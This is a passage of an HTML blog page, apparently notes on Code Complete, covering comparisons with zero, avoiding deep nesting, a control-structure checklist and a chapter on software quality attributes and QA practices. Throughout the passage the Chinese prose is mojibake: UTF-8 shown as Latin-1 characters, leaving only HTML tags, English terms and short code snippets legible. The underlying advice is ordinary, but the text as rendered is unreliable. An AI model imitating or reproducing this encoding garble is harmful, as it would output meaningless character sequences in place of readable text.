æ˜¯ä¸€ä¸ªæ•°å€¼ï¼Œæ˜¯ç©ºæŒ‡é’ˆçš„å–å€¼ï¼Œæ˜¯æšä¸¾çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å–å€¼ï¼Œæ˜¯é€»è¾‘è¡¨è¾¾å¼ä¸­çš„ falseï¼Œæ—¢ç„¶å®ƒæœ‰è¿™ä¹ˆå¤šçš„ç”¨é€”ï¼Œå› æ­¤åœ¨ä»£ç ä¸­åº”è¯¥å½°æ˜¾ 0 çš„æ˜ç¡®å«ä¹‰ã€‚</p><h3 id="ä¸-0-æ¯”è¾ƒçš„æŒ‡å¯¼åŸåˆ™"><a href="#ä¸-0-æ¯”è¾ƒçš„æŒ‡å¯¼åŸåˆ™" class="headerlink" title="ä¸ 0 æ¯”è¾ƒçš„æŒ‡å¯¼åŸåˆ™"></a>ä¸ 0 æ¯”è¾ƒçš„æŒ‡å¯¼åŸåˆ™</h3><ul><li>éšå¼åœ°æ¯”è¾ƒé€»è¾‘å˜é‡</li><li>æŠŠæ•°å­—å’Œ 0 æ¯”è¾ƒæ—¶ï¼Œåº”å†™ä½œ <code>if(balance != 0)</code>è€Œé<code>if(!balance)</code></li><li>åœ¨ C ä¸­æ˜¾ç¤ºåœ°æ¯”è¾ƒå­—ç¬¦å’Œé›¶ç»ˆæ­¢ç¬¦ï¼ˆ<code>&#39;\0&#39;</code>ï¼‰</li><li>æŒ‡é’ˆä¸ NULL æ¯”è¾ƒ</li></ul><p><em>åœ¨è¿›è¡Œæ¡ä»¶åˆ¤æ–­æ—¶ï¼Œæˆ‘ä»¬å¸¸å¸¸å¯èƒ½å› å°‘å†™äº†ä¸€ä¸ª<code>=</code>è€Œå°†<code>==</code>å†™ä½œèµ‹å€¼ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠå¸¸é‡å†™åœ¨è¡¨è¾¾å¼çš„å·¦ä¾§ï¼Œè¿™æ ·ï¼Œå½“æˆ‘ä»¬å°‘å†™äº†ä¸€ä¸ª<code>=</code>æ—¶ï¼Œç¼–è¯‘å™¨å°±ä¼šåŠæ—¶æ•è·åˆ°é”™è¯¯ã€‚</em></p><h3 id="é¿å…æ·±å±‚åµŒå¥—"><a href="#é¿å…æ·±å±‚åµŒå¥—" class="headerlink" title="é¿å…æ·±å±‚åµŒå¥—"></a>é¿å…æ·±å±‚åµŒå¥—</h3><ul><li>å°†æ·±å±‚åµŒå¥—çš„åˆ¤æ–­æ¡ä»¶åˆå¹¶</li><li>å°†åˆ¤æ–­æ¡ä»¶è½¬æ¢ä¸º if-else ç»“æ„</li><li>ä½¿ç”¨ case è¯­å¥åˆ¤æ–­</li><li>å°†å¤æ‚çš„æ·±å±‚åµŒå¥—ä»£ç æŠ½å–ä¸ºå•ç‹¬çš„å­ç¨‹åº</li><li>ä½¿ç”¨å¯¹è±¡å’Œå¤šæ€</li><li>ç”¨çŠ¶æ€å˜é‡é‡å†™ä»£ç </li><li>é‡æ–°è®¾è®¡æ·±å±‚åµŒå¥—ä»£ç </li></ul><p><strong>å¤æ‚çš„ä»£ç è¡¨æ˜ä½ è¿˜æ²¡æœ‰å……åˆ†ç†è§£ä½ çš„ç¨‹åº</strong>ï¼Œæ‰€ä»¥æ— æ³•ç®€åŒ–å®ƒã€‚æ·±å±‚åµŒå¥—æ˜¯ä¸€ä¸ªè­¦å‘Šï¼Œå®ƒè¯´æ˜ä½ è¦ä¹ˆåº”è¯¥æ‹†åˆ†å‡ºä¸€ä¸ªå­ç¨‹åºï¼Œè¦ä¹ˆåº”è¯¥é‡æ–°è®¾è®¡é‚£éƒ¨åˆ†å¤æ‚çš„ä»£ç ã€‚</p><p><strong>ç»“æ„åŒ–ç¼–ç¨‹çš„æ ¸å¿ƒæ€æƒ³æ˜¯æŒ‡ï¼Œä¸€ä¸ªåº”ç”¨ç¨‹åºåº”è¯¥åªé‡‡ç”¨ä¸€äº›å•å…¥å•å‡ºçš„æ§åˆ¶ç»“æ„</strong>ã€‚å•å…¥å•å‡ºçš„æ§åˆ¶ç»“æ„æ˜¯æŒ‡ä¸€ä¸ªä»£ç å—ï¼Œå®ƒåªèƒ½ä»ä¸€ä¸ªä½ç½®å¼€å§‹æ‰§è¡Œï¼Œå¹¶ä¸”åªèƒ½ç»“æŸäºä¸€ä¸ªä½ç½®ï¼Œé™¤æ­¤ä¹‹å¤–å†æ— å…¶ä»–å…¥å£æˆ–å‡ºå£ã€‚ä¸€ä¸ªç»“æ„åŒ–çš„ç¨‹åºå°†æŒ‰ç…§ä¸€ç§æœ‰åºçš„ä¸”æœ‰è§„åˆ™çš„æ–¹å¼æ‰§è¡Œï¼Œä¸ä¼šåšä¸å¯é¢„çŸ¥çš„éšä¾¿è·³è½¬ã€‚ç»“æ„åŒ–ç¼–ç¨‹å’Œç»“æ„åŒ–çš„ã€è‡ªä¸Šè€Œä¸‹çš„è®¾è®¡ä¸å®Œå…¨ä¸€æ ·ï¼Œå‰è€…åªé€‚ç”¨äºå…·ä½“ç¼–ç å±‚ã€‚</p><p>ç¨‹åºå¤æ‚åº¦çš„ä¸€ä¸ªè¡¡é‡æ ‡å‡†æ˜¯ï¼Œä¸ºäº†ç†è§£åº”ç”¨ç¨‹åºï¼Œä½ å¿…é¡»åœ¨åŒä¸€æ—¶é—´è®°ä½çš„å®ä½“çš„æ•°é‡ã€‚æœ‰èƒ½åŠ›çš„ç¨‹åºå‘˜ä¼šå……åˆ†åœ°è®¤è¯†åˆ°è‡ªå·±çš„å¤§è„‘å®¹é‡æ˜¯å¤šä¹ˆæœ‰é™ï¼Œæ‰€ä»¥ä»–ä»¬ä¼šéå¸¸è°¦å‘åœ°å¤„ç†ç¼–ç¨‹ä»»åŠ¡ã€‚</p><h3 id="æ§åˆ¶ç»“æ„çš„ç›¸å…³äº‹å®œ"><a href="#æ§åˆ¶ç»“æ„çš„ç›¸å…³äº‹å®œ" class="headerlink" title="æ§åˆ¶ç»“æ„çš„ç›¸å…³äº‹å®œ"></a>æ§åˆ¶ç»“æ„çš„ç›¸å…³äº‹å®œ</h3><ul><li>è¡¨è¾¾å¼ä¸­ç”¨çš„æ˜¯trueå’Œfalseï¼Œè€Œä¸æ˜¯1å’Œ0å—?</li><li>å¸ƒå°”å€¼å’Œtrueä»¥åŠfalseåšæ¯”è¾ƒæ˜¯éšå¼è¿›è¡Œçš„å—?</li><li>å¯¹æ•°å€¼åšæ¯”è¾ƒæ˜¯æ˜¾å¼è¿›è¡Œçš„å—?</li><li>æœ‰æ²¡æœ‰é€šè¿‡å¢åŠ æ–°çš„å¸ƒå°”å˜é‡ã€ä½¿ç”¨å¸ƒå°”å‡½æ•°å’Œå†³ç­–è¡¨æ¥ç®€åŒ–è¡¨è¾¾å¼?</li><li>å¸ƒå°”è¡¨è¾¾å¼æ˜¯ç”¨è‚¯å®šå½¢å¼è¡¨è¾¾çš„å—?</li><li>æ‹¬å·é…å¯¹å—?</li><li>åœ¨éœ€è¦ç”¨æ‹¬å·æ¥æ˜ç¡®çš„åœ°æ–¹éƒ½ä½¿ç”¨äº†æ‹¬å·å—?</li><li>æŠŠé€»è¾‘è¡¨è¾¾å¼å…¨æ‹¬èµ·æ¥äº†å—?</li><li>åˆ¤æ–­æ˜¯æŒ‰ç…§æ•°è½´é¡ºåºç¼–å†™çš„å—?</li><li>å¦‚æœé€‚å½“çš„è¯ï¼ŒJava ä¸­çš„åˆ¤æ–­ç”¨çš„æ˜¯<code>a.equals(b)</code>æ–¹å¼ï¼Œ è€Œæ²¡æœ‰ç”¨<code>a==b</code>æ–¹å¼å—?</li><li>ç©ºè¯­å¥è¡¨è¿°å¾—æ˜æ˜¾å—?</li><li>ç”¨é‡æ–°åˆ¤æ–­éƒ¨åˆ†æ¡ä»¶ã€è½¬æ¢æˆif-then-else æˆ–è€…case è¯­å¥ã€æŠŠåµŒå¥—ä»£ç æå–æˆå•ç‹¬çš„å­ç¨‹åºã€æ¢ç”¨ä¸€ç§æ›´é¢å‘å¯¹è±¡çš„è®¾è®¡æˆ–è€…å…¶ä»–çš„æ”¹è¿›æ–¹æ³•æ¥ç®€åŒ–åµŒå¥—è¯­å¥äº†å—?</li><li>å¦‚æœä¸€ä¸ªå­ç¨‹åºçš„å†³ç­–ç‚¹è¶…è¿‡10ä¸ªï¼Œé‚£ä¹ˆèƒ½æå‡ºä¸é‡æ–°è®¾è®¡çš„ç†ç”±å—?</li></ul><h2 id="ç¬¬20ç« -è½¯ä»¶è´¨é‡æ¦‚è¿°"><a href="#ç¬¬20ç« -è½¯ä»¶è´¨é‡æ¦‚è¿°" class="headerlink" title="ç¬¬20ç«  è½¯ä»¶è´¨é‡æ¦‚è¿°"></a>ç¬¬20ç«  è½¯ä»¶è´¨é‡æ¦‚è¿°</h2><h3 id="è½¯ä»¶è´¨é‡ç‰¹æ€§"><a href="#è½¯ä»¶è´¨é‡ç‰¹æ€§" class="headerlink" title="è½¯ä»¶è´¨é‡ç‰¹æ€§"></a>è½¯ä»¶è´¨é‡ç‰¹æ€§</h3><ul><li><p>å¤–åœ¨ç‰¹æ€§</p><ul><li><strong>æ­£ç¡®æ€§(Correctness)</strong>ã€‚æŒ‡ç³»ç»Ÿè§„èŒƒã€è®¾è®¡å’Œå®ç°æ–¹é¢çš„é”™è¯¯çš„ç¨€å°‘ç¨‹åº¦ã€‚</li><li><strong>å¯ç”¨æ€§(Usability)</strong>ï¼ŒæŒ‡ç”¨æˆ·å­¦ä¹ å’Œä½¿ç”¨ä¸€ä¸ªç³»ç»Ÿçš„å®¹æ˜“ç¨‹åº¦ã€‚</li><li><strong>æ•ˆç‡ (Efficiency)</strong>ã€‚æŒ‡è½¯ä»¶æ˜¯å¦å°½å¯èƒ½å°‘åœ°å ç”¨ç³»ç»Ÿèµ„æºï¼ŒåŒ…æ‹¬å†…å­˜å’Œæ‰§è¡Œæ—¶é—´ã€‚</li><li><strong>å¯é æ€§(Reliability)</strong>ã€‚æŒ‡åœ¨æŒ‡å®šçš„å¿…éœ€æ¡ä»¶ä¸‹ï¼Œä¸€ä¸ªç³»ç»Ÿå®Œæˆæ‰€éœ€è¦åŠŸèƒ½çš„èƒ½åŠ›â€”â€”åº”è¯¥æœ‰å¾ˆé•¿çš„å¹³å‡æ— æ•…éšœæ—¶é—´ã€‚</li><li><strong>å®Œæ•´æ€§(Integrity)</strong>ã€‚æŒ‡ç³»ç»Ÿé˜»æ­¢å¯¹ç¨‹åºæˆ–è€…æ•°æ®è¿›è¡Œæœªç»éªŒè¯æˆ–è€…ä¸æ­£ç¡®è®¿é—®çš„èƒ½åŠ›ã€‚è¿™é‡Œçš„å®Œæ•´æ€§é™¤äº†åŒ…æ‹¬é™åˆ¶æœªç»æˆæƒç”¨æˆ·çš„è®¿é—®å¤–ï¼Œè¿˜åŒ…æ‹¬ç¡®ä¿æ•°æ®èƒ½å¤Ÿæ­£ç¡®è®¿é—®ã€‚</li><li><strong>é€‚åº”æ€§(Adaptability)</strong>ã€‚æŒ‡ä¸ºç‰¹å®šçš„åº”ç”¨æˆ–è€…ç¯å¢ƒè®¾è®¡çš„ç³»ç»Ÿï¼Œåœ¨ä¸åšä¿®æ”¹çš„æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿåœ¨å…¶ä»–åº”ç”¨æˆ–è€…ç¯å¢ƒä¸­ä½¿ç”¨çš„èŒƒå›´ã€‚</li><li><strong>ç²¾ç¡®æ€§(Accuracy)</strong>ã€‚æŒ‡å¯¹äºä¸€ä¸ªå·²ç»å¼€å‘å‡ºçš„ç³»ç»Ÿï¼Œè¾“å‡ºç»“æœçš„è¯¯å·®ç¨‹åº¦,å°¤å…¶åœ¨è¾“å‡ºçš„æ˜¯æ•°é‡å€¼çš„æ—¶å€™ã€‚ç²¾ç¡®æ€§å’Œæ­£ç¡®æ€§çš„ä¸åŒåœ¨äºï¼Œå‰è€…æ˜¯ç”¨æ¥åˆ¤æ–­ç³»ç»Ÿå®Œæˆå·¥ä½œçš„ä¼˜åŠ£ç¨‹åº¦ï¼Œè€Œåè€…åˆ™æ˜¯åˆ¤æ–­ç³»ç»Ÿæ˜¯å¦è¢«æ­£ç¡®å¼€å‘å‡ºæ¥ã€‚</li><li><strong>å¥å£®æ€§( Robustness)</strong>ã€‚è¿™æŒ‡çš„æ˜¯ç³»ç»Ÿåœ¨æ¥æ”¶æ— æ•ˆè¾“å…¥æˆ–è€…å¤„äºå‹åŠ›ç¯å¢ƒæ—¶ç»§ç»­æ­£å¸¸è¿è¡Œçš„èƒ½åŠ›ã€‚</li></ul></li><li><p>å†…åœ¨ç‰¹æ€§</p><ul><li><strong>å¯ç»´æŠ¤æ€§(Maintainability)</strong>ã€‚æŒ‡æ˜¯å¦èƒ½å¤Ÿå¾ˆå®¹æ˜“å¯¹ç³»ç»Ÿè¿›è¡Œä¿®æ”¹ï¼Œæ”¹å˜æˆ–è€…å¢åŠ åŠŸèƒ½ï¼Œæé«˜æ€§èƒ½ï¼Œä»¥åŠä¿®æ­£ç¼ºé™·ã€‚</li><li><strong>çµæ´»æ€§(Flexibility)</strong>ã€‚æŒ‡å‡å¦‚ä¸€ä¸ªç³»ç»Ÿæ˜¯ä¸ºç‰¹å®šç”¨é€”æˆ–è€…ç¯å¢ƒè€Œè®¾è®¡çš„,é‚£ä¹ˆå½“è¯¥ç³»ç»Ÿè¢«ç”¨äºå…¶ä»–ç›®çš„æˆ–è€…ç¯å¢ƒçš„æ—¶å€™ï¼Œéœ€è¦å¯¹ç³»ç»Ÿåšä¿®æ”¹çš„ç¨‹åº¦ã€‚</li><li><strong>å¯ç§»æ¤æ€§(Portability)</strong>ã€‚æŒ‡ä¸ºäº†åœ¨åŸæ¥è®¾è®¡çš„ç‰¹å®šç¯å¢ƒä¹‹å¤–è¿è¡Œï¼Œå¯¹ç³»ç»Ÿæ‰€è¿›è¡Œä¿®æ”¹çš„éš¾æ˜“ç¨‹åº¦ã€‚</li><li><strong>å¯é‡ç”¨æ€§(Reusability)</strong>ã€‚æŒ‡ç³»ç»Ÿçš„æŸäº›éƒ¨åˆ†å¯è¢«åº”ç”¨åˆ°å…¶ä»–ç³»ç»Ÿä¸­çš„ç¨‹åº¦,ä»¥åŠæ­¤é¡¹å·¥ä½œçš„éš¾æ˜“ç¨‹åº¦ã€‚</li><li><strong>å¯è¯»æ€§(Readability)</strong>ã€‚æŒ‡é˜…è¯»å¹¶ç†è§£ç³»ç»Ÿä»£ç çš„éš¾æ˜“ç¨‹åº¦ï¼Œå°¤å…¶æ˜¯åœ¨ç»†èŠ‚è¯­å¥çš„å±‚æ¬¡ä¸Šã€‚</li><li><strong>å¯æµ‹è¯•æ€§(Testabiity)</strong>ã€‚æŒ‡çš„æ˜¯ä½ å¯ä»¥è¿›è¡Œä½•ç§ç¨‹åº¦çš„å•å…ƒæµ‹è¯•æˆ–è€…ç³»ç»Ÿæµ‹è¯•ï¼Œä»¥åŠåœ¨ä½•ç§ç¨‹åº¦ä¸ŠéªŒè¯ç³»ç»Ÿæ˜¯å¦ç¬¦åˆéœ€æ±‚ã€‚</li><li><strong>å¯ç†è§£æ€§(Understandability)</strong>ã€‚æŒ‡ åœ¨ç³»ç»Ÿç»„ç»‡å’Œç»†èŠ‚è¯­å¥çš„å±‚æ¬¡ä¸Šç†è§£æ•´ä¸ªç³»ç»Ÿçš„éš¾æ˜“ç¨‹åº¦ã€‚ä¸å¯è¯»æ€§ç›¸æ¯”ï¼Œå¯ç†è§£æ€§å¯¹ç³»ç»Ÿæå‡ºäº†æ›´é«˜çš„å†…åœ¨ä¸€è‡´æ€§è¦æ±‚ã€‚</li></ul></li></ul><p>å¤–åœ¨ç‰¹æ€§ä¸å†…åœ¨ç‰¹æ€§å¹¶ä¸å®Œå…¨å‰²è£‚ï¼Œåœ¨æŸäº›å±‚æ¬¡ä¸Šå†…åœ¨ç‰¹æ€§ä¼šå½±å“å¤–åœ¨ç‰¹æ€§ã€‚</p><p>è¦è®©æ‰€æœ‰ç‰¹æ€§éƒ½èƒ½è¡¨ç°å¾—å°½å–„å°½ç¾æ˜¯ç»æ— å¯èƒ½çš„ã€‚éœ€è¦æ ¹æ®ä¸€ç»„äº’ç›¸ç«äº‰çš„ç›®æ ‡å¯»æ‰¾å‡ºä¸€å¥—ä¼˜åŒ–çš„è§£å†³æ–¹æ¡ˆï¼Œæ­£æ˜¯è¿™ç§æƒ…å†µä½¿è½¯ä»¶å¼€å‘æˆä¸ºä¸€ä¸ªçœŸæ­£çš„å·¥ç¨‹å­¦ç§‘ã€‚</p><h3 id="æ”¹å–„è½¯ä»¶è´¨é‡çš„æ–¹æ³•"><a href="#æ”¹å–„è½¯ä»¶è´¨é‡çš„æ–¹æ³•" class="headerlink" title="æ”¹å–„è½¯ä»¶è´¨é‡çš„æ–¹æ³•"></a>æ”¹å–„è½¯ä»¶è´¨é‡çš„æ–¹æ³•</h3><ul><li>è®¾å®šè´¨é‡ç›®æ ‡ã€‚æ ¹æ®ä¸Šä¸€èŠ‚æ‰€æåˆ°çš„è½¯ä»¶è´¨é‡ç‰¹æ€§ï¼Œæ˜ç¡®å®šä¹‰å‡ºè½¯ä»¶è´¨é‡çš„ç›®æ ‡ï¼Œå¹¶è¦æ±‚å¼€å‘è€…æœç€ç›®æ ‡åŠªåŠ›ã€‚</li><li>æ˜ç¡®å®šä¹‰è´¨é‡ä¿è¯å·¥ä½œ</li><li>æµ‹è¯•ç­–ç•¥</li><li>è½¯ä»¶å·¥ç¨‹æŒ‡å—</li><li>éæ­£å¼æŠ€æœ¯å¤æŸ¥</li><li>æ­£å¼æŠ€æœ¯å¤æŸ¥</li><li>å¤–éƒ¨å®¡æŸ¥</li></ul><h3 id="å¼€å‘è¿‡ç¨‹"><a href="#å¼€å‘è¿‡ç¨‹" class="headerlink" title="å¼€å‘è¿‡ç¨‹"></a>å¼€å‘è¿‡ç¨‹</h3><ul><li><strong>å¯¹å˜æ›´è¿›è¡Œæ§åˆ¶çš„è¿‡ç¨‹</strong>ã€‚å®ç°è½¯ä»¶è´¨é‡ç›®æ ‡çš„æ‹¦è·¯è™ä¹‹ä¸€å°±æ˜¯å¤±æ§çš„å˜æ›´ã€‚éœ€æ±‚å˜æ›´çš„å¤±æ§å¯èƒ½ä½¿è®¾è®¡å’Œç¼–ç å·¥ä½œå‰åŠŸå°½å¼ƒï¼›è®¾è®¡å˜æ›´çš„å¤±æ§åˆ™ä¼šé€ æˆä»£ç ä¸éœ€æ±‚èƒŒç¦»ï¼Œæˆ–ä»£ç è‡ªç›¸çŸ›ç›¾ï¼Œæˆ–æ˜¯ç¨‹åºå‘˜ä¸ºè¾¾åˆ°å˜æ›´åçš„è®¾è®¡è¦æ±‚ï¼Œä¸å¾—ä¸è€—è´¹æ¯”æ¨è¿›é¡¹ç›®æ›´å¤šçš„æ—¶é—´æ¥ä¿®æ”¹ä»£ç ã€‚ä»£ç å˜æ›´çš„å¤±æ§åˆ™å¯èƒ½é€ æˆå†…éƒ¨å†²çªï¼Œç¨‹åºå‘˜æ— æ³•ç¡®å®šå“ªäº›ä»£ç å·²ç»è¿‡å®Œå…¨å¤æŸ¥å’Œæµ‹è¯•ï¼Œè€Œå“ªäº›æ²¡æœ‰ã€‚å˜æ¥å˜å»çš„è‡ªç„¶å½±å“å°±æ˜¯è´¨é‡ä¸ç¨³å®šå’Œæ¶åŒ–ï¼Œå› æ­¤ï¼Œ<strong>æœ‰æ•ˆåœ°ç®¡ç†å˜æ›´æ˜¯å®ç°é«˜è´¨é‡çš„ä¸€ä¸ªå…³é”®</strong>ã€‚</li><li><strong>ç»“æœçš„é‡åŒ–</strong>ã€‚é™¤éè´¨é‡ä¿è¯è®¡åˆ’çš„ç»“æœç»è¿‡å®é™…æµ‹é‡ï¼Œå¦åˆ™ä½ å°†å®Œå…¨ä¸çŸ¥é“è¿™ä¸ªè®¡åˆ’æ˜¯å¦æœ‰å®æ•ˆã€‚é‡åŒ–ç»“æœèƒ½å‘Šè¯‰ä½ è®¡åˆ’æˆåŠŸä¸å¦ï¼Œå¹¶ä¸”å…è®¸ä½ ç”¨å¯æ§çš„æ–¹å¼æ¥è°ƒæ•´ä½ çš„è®¡åˆ’ï¼Œå»çœ‹ä½ èƒ½å¦‚ä½•æ”¹å–„å®ƒã€‚ä½ ä¹Ÿå¯ä»¥åº¦é‡å„ç§è´¨é‡ç‰¹æ€§æœ¬èº«â€”â€”æ­£ç¡®æ€§ã€å¯ç”¨æ€§ä»¥åŠæ•ˆç‡ç­‰ï¼Œè¿™ä¹ˆåšæ˜¯å¾ˆæœ‰ç”¨çš„ã€‚</li><li><strong>åˆ¶ä½œåŸå‹(Prototyping)åˆ¶ä½œ</strong>ã€‚åŸå‹æ˜¯æŒ‡å¼€å‘å‡ºç³»ç»Ÿä¸­å…³é”®åŠŸèƒ½çš„å®é™…æ¨¡å‹ã€‚å¯¹ä¸€ä¸ªå¼€å‘è€…æ¥è¯´ï¼Œå¼€å‘å‡ºä¸€éƒ¨åˆ†ç”¨æˆ·ç•Œé¢çš„åŸå‹å¯ä»¥åˆ¤æ–­ç³»ç»Ÿçš„å¯ç”¨æ€§ï¼Œå¼€å‘å‡ºå…³é”®ç®—æ³•çš„åŸå‹å¯ä»¥ç¡®å®šåŠŸèƒ½çš„æ‰§è¡Œæ—¶é—´ï¼Œå¼€å‘å‡ºå…¸å‹æ•°æ®é›†çš„åŸå‹èƒ½çŸ¥é“ç¨‹åºçš„å†…å­˜éœ€æ±‚ã€‚æ„å»ºåŸå‹èƒ½äº§ç”Ÿæ›´å®Œå–„çš„è®¾è®¡ï¼Œæ›´è´´è¿‘ç”¨æˆ·çš„éœ€æ±‚ï¼Œä»¥åŠæ›´å¥½çš„å¯ç»´æŠ¤æ€§ã€‚</li></ul><h3 id="ä¸åŒè´¨é‡ä¿éšœæŠ€æœ¯çš„ç›¸å¯¹æ•ˆèƒ½"><a href="#ä¸åŒè´¨é‡ä¿éšœæŠ€æœ¯çš„ç›¸å¯¹æ•ˆèƒ½" class="headerlink" title="ä¸åŒè´¨é‡ä¿éšœæŠ€æœ¯çš„ç›¸å¯¹æ•ˆèƒ½"></a>ä¸åŒè´¨é‡ä¿éšœæŠ€æœ¯çš„ç›¸å¯¹æ•ˆèƒ½</h3><p>é€šè¿‡ç»“åˆå¤šç§bug æ£€æµ‹æ–¹å¼æ¥æœ‰æ•ˆé™ä½ bug ç‡ï¼Œå¦‚ä»£ç  reviewã€å•å…ƒæµ‹è¯•ã€é›†æˆæµ‹è¯•ã€å›å½’æµ‹è¯•ç­‰ã€‚</p><p><strong>æ£€æŸ¥ä»£ç å‘ç° bug æ¯”æµ‹è¯•å‡º bug çš„æˆæœ¬æ›´å°</strong>ï¼Œå› æ­¤ï¼Œå½“å¼€å‘å®Œæ–°åŠŸèƒ½æ—¶ï¼Œéœ€è¦å…ˆé€šè¯»æœ¬æ¬¡çš„å¼€å‘ä»£ç ï¼Œç„¶åè‡ªå·±è¿›è¡Œæµç¨‹æµ‹è¯•ã€‚</p><p>ä¼¼ä¹ä¿®æ­£ç›¸åŒ bug çš„æˆæœ¬æ˜¯ç›¸åŒçš„ï¼Œä½†äº‹å®å¹¶éå¦‚æ­¤ã€‚å› ä¸º<strong>ä¸€ä¸ªbug å­˜åœ¨çš„æ—¶é—´è¶Šé•¿ï¼Œæ¶ˆé™¤å®ƒçš„ä»£ä»·ä¹Ÿå°±è¶Šå¤§</strong>ï¼Œå› æ­¤èƒ½å¤Ÿå°½æ—©å‘ç°é”™è¯¯çš„æ£€æµ‹æ–¹æ³•å¯ä»¥é™ä½ä¿®æ­£ bug çš„æˆæœ¬ã€‚</p><p>åœ¨ä¸€ä¸ªç”±è¶…è¿‡400åç¨‹åºå‘˜åˆ›å»ºçš„ 70 ä¸‡è¡Œä»£ç ç¨‹åºä¸­ï¼Œä»£ç å¤æŸ¥çš„æˆæœ¬æ•ˆç›Šæ¯”æµ‹è¯•é«˜å‡ºå¥½å‡ å€â€”â€”å‰è€…çš„å›æŠ¥ç‡ä¸º 1.38ï¼Œåè€…ä»…ä¸º 0.17ã€‚</p><p>ä¸€ä¸ªæœ‰æ•ˆçš„è½¯ä»¶è´¨é‡é¡¹ç›®çš„åº•çº¿ï¼Œå¿…é¡»åŒ…æ‹¬åœ¨å¼€å‘çš„æ‰€æœ‰é˜¶æ®µè”åˆä½¿ç”¨å¤šç§æŠ€æœ¯ï¼Œä¸‹é¢æ˜¯ä¸€å¥—æ¨èé˜µå®¹ï¼Œé€šè¿‡å®ƒä»¬å¯ä»¥è·å–é«˜äºå¹³å‡æ°´å¹³çš„è´¨é‡ï¼š</p><ul><li>å¯¹æ‰€æœ‰çš„éœ€æ±‚ã€æ¶æ„ä»¥åŠç³»ç»Ÿå…³é”®éƒ¨åˆ†çš„è®¾è®¡è¿›è¡Œæ­£å¼æ£€æŸ¥</li><li>å»ºæ¨¡æˆ–è€…åˆ›å»ºåŸå‹</li><li>ä»£ç é˜…è¯»æˆ–è€…æ£€æŸ¥</li><li>æ‰§è¡Œæµ‹è¯•</li></ul><p><strong>è´¨é‡ä¿éšœå·¥ä½œåº”è¯¥è´¯ç©¿äºæ•´ä¸ªé¡¹ç›®å‘¨æœŸä¸­ï¼Œå°¤å…¶æ˜¯è°ƒç ”ä¸æ¶æ„è®¾è®¡é˜¶æ®µï¼Œåœ¨é¡¹ç›®åˆæœŸå¼•å…¥ç¼ºé™·ï¼Œè¿™ä¸ªç¼ºé™·ä¼šåƒæ ¸è¾å°„ä¸€æ ·æ±¡æŸ“æ•´ä¸ªé¡¹ç›®ã€‚</strong></p><p><strong>è½¯ä»¶äº§å“çš„ä¸šç•Œå¹³å‡ç”Ÿäº§æ•ˆç‡å¤§çº¦æ˜¯æ¯äººæ¯å¤© 10~50 è¡Œæœ€ç»ˆäº¤ä»˜ä»£ç ï¼Œé‚£ä¹ˆæ¯å¤©å‰©ä¸‹çš„æ—¶é—´æ˜¯æ€ä¹ˆåº¦è¿‡çš„å‘¢ï¼Ÿ</strong>ç»å¤§å¤šæ•°é¡¹ç›®æœ€å¤§è§„æ¨¡çš„ä¸€ç§æ´»åŠ¨å°±æ˜¯è°ƒè¯•ä»¥åŠä¿®æ­£é‚£äº›æ— æ³•æ­£å¸¸å·¥ä½œçš„ä»£ç ã€‚è°ƒè¯•å’Œä¸æ­¤ç›¸å…³çš„é‡æ„æˆ–è€…å…¶ä»–è¿”å·¥å·¥ä½œï¼Œåœ¨ä¼ ç»Ÿçš„ä¸æˆç†Ÿçš„è½¯ä»¶å¼€å‘å‘¨æœŸå½“ä¸­å¯èƒ½æ¶ˆè€—å¤§çº¦50%çš„æ—¶é—´ã€‚åªè¦é¿å…å¼•å…¥é”™è¯¯ï¼Œå°±å¯ä»¥å‡å°‘è¯•æ—¶é—´ï¼Œä»è€Œæé«˜ç”Ÿäº§åŠ›ã€‚å› æ­¤ï¼Œ<strong>æ•ˆæœæœ€æ˜æ˜¾çš„ç¼©çŸ­å¼€å‘å‘¨æœŸçš„åŠæ³•å°±æ˜¯æ”¹å–„äº§å“çš„è´¨é‡ï¼Œç”±æ­¤å‡å°‘èŠ±è´¹åœ¨è°ƒè¯•å’Œè½¯ä»¶è¿”å·¥ä¸Šé¢çš„æ—¶é—´æ€»é‡</strong>ã€‚æ›´å¤šè´¨é‡ä¿è¯å·¥ä½œèƒ½é™ä½ bug ç‡ï¼Œä½†ä¸ä¼šå¢åŠ å¼€å‘çš„æ€»æˆæœ¬ã€‚IBMçš„ä¸€ä¸ªç ”ç©¶ä¹Ÿå¾—åˆ°äº†ç±»ä¼¼çš„ç»“è®ºï¼š<strong>ç¼ºé™·æœ€å°‘çš„è½¯ä»¶é¡¹ç›®çš„å¼€å‘è®¡åˆ’æ—¶é—´æœ€çŸ­ï¼Œå¹¶æ‹¥æœ‰æœ€é«˜çš„å¼€å‘ç”Ÿäº§ç‡â€¦.æ¶ˆé™¤è½¯ä»¶ç¼ºé™·å®é™…ä¸Šæ˜¯æœ€æ˜‚è´µä¸”æœ€è€—æ—¶çš„ä¸€ç§è½¯ä»¶å·¥ä½œ</strong>(Jones2000)ã€‚</p><blockquote><p>æ‰€æœ‰çš„â€œåŠŸèƒ½å…ˆä¸Šçº¿ï¼Œä¼˜åŒ–åæœŸåšâ€éƒ½æ˜¯ä¼ªå‘½é¢˜ã€‚éšç€é¡¹ç›®çš„å‘å±•ï¼Œè¶Šæ¥è¶Šå¤šçš„ bug å¼•å…¥é¡¹ç›®ä¸­ï¼Œå¯¼è‡´åæœŸçš„å¼€å‘ä¸æ–­è¢«åé¦ˆçš„ bug æ‰“æ–­ï¼Œæ— æ³•ä¸“æ³¨å¼€å‘ï¼Œä»è€Œé€ æˆæ­£åœ¨å¼€å‘åŠŸèƒ½çš„ bugï¼Œå½¢æˆæ¶æ€§å¾ªç¯â€¦â€¦</p></blockquote><h3 id="Key-Points"><a href="#Key-Points" class="headerlink" title="Key Points"></a>Key Points</h3><ul><li>å¼€å‘é«˜è´¨é‡ä»£ç æœ€ç»ˆå¹¶æ²¡æœ‰è¦æ±‚ä½ ä»˜å‡ºæ›´å¤šï¼Œåªæ˜¯ä½ éœ€è¦å¯¹èµ„æºè¿›è¡Œé‡æ–°åˆ†é…ï¼Œä»¥ä½å»‰çš„æˆæœ¬æ¥é˜²æ­¢ç¼ºé™·å‡ºç°ï¼Œä»è€Œé¿å…ä»£ä»·é«˜æ˜‚çš„ä¿®æ­£å·¥ä½œã€‚</li><li><strong>å¹¶éæ‰€æœ‰çš„è´¨é‡ä¿è¯ç›®æ ‡éƒ½å¯ä»¥å…¨éƒ¨å®ç°ã€‚æ˜ç¡®å“ªäº›ç›®æ ‡æ˜¯ä½ 